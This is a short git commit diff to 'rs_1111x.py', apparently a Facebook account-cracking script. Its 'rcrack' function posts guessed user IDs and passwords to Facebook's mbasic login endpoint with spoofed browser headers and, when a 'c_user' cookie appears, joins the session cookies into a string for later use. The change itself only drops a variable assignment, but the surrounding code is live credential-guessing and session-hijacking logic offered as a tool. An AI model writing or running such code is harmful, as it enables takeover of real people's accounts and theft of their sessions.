74e31bae3628d51cdd373ef28196515deab2b3c2
RAYHAN-SHAKIB <125536755+RAYHAN-05@users.noreply.github.com>
2023-08-04 17:48:25 +0600

    Add files via upload

--- rs_1111x.py
+++ rs_1111x.py
@@ -233,7 +233,7 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro,}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+            session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
